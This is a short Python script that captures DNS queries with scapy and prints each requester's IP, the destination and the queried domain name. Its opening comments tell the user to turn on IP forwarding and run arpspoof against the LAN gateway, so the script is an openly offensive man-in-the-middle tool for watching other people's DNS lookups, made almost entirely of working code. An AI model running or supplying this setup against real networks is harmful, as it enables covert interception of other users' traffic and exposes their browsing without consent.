# Largely inspired by https://null-byte.wonderhowto.com/how-to/build-dns-packet-sniffer-with-scapy-and-python-0163601/
# Before launching this python script, be sure to run :
# echo "1" > /proc/sys/net/ipv4/ip_forward
# arpspoof -i eth0 -t 192.168.1.1 # (Gateway IP address if you're on a LAN)

from pip._vendor.distlib.compat import raw_input
from scapy.all import *
import sys

from scapy.layers.dns import DNS
from scapy.layers.inet import IP

try:
    interface = raw_input("[*] Enter desired Interface : ")
except KeyboardInterrupt:
    print("[*] User Requests Shutdown")
    print("[*] Exiting")
    sys.exit(1)


def query_sniff(pkt):
    if IP in pkt:
        ip_src = pkt[IP].src
        ip_dst = pkt[IP].dst
        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
            print(ip_src, " -> ", ip_dst, " : ", "(", pkt.getlayer(DNS).qd.qname, ")")


sniff(iface=interface, filter="port 53", prn=query_sniff, store=0)
print("\n[*] Shutting Down...")
